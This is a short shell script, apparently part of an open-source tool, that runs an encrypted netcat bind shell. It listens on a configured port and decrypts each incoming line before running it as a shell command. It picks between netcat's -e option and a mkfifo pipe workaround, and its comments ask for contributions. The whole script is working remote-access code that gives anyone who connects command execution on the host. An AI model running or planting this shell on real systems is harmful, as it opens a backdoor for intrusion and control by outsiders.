#!/bin/sh

# Author: techgaun

SCRIPT=$(readlink -f "$0")
BASEDIR=$(dirname $SCRIPT)
. "${BASEDIR}/common.sh"

req=

trap 'rm -f /tmp/f; quit' INT TERM QUIT
NC_TYPE="openbsd"

if nc -h 2>&1 | grep "-e filename" > /dev/null 2>&1; then
    NC_TYPE="traditional"
fi
while :; do
    if [ "${NC_TYPE}" = "traditional" ]; then
        "${NC}" -n -l -p "${BIND_PORT}" -e "./cmd.sh"
    else
        rm -f /tmp/f
        mkfifo /tmp/f
        #cat /tmp/f | stdindecrypt | ${SHELL} 2>&1 | stdinencrypt | "${NC}" -l -p "${BIND_PORT}" > /tmp/f
        #this is very hacky atm; shell gurus, please contribute :)
        #currently, client does not output of the command for nc.openbsd :/
        #will fix whenever I can research more on this; PRs welcome
        "${NC}" -l -p "${BIND_PORT}" < /tmp/f | (read -r req; req=$(decrypt "${req}"); "${SHELL}" -c "${req}" 2>&1 | stdinencrypt) > /tmp/f
    fi
done
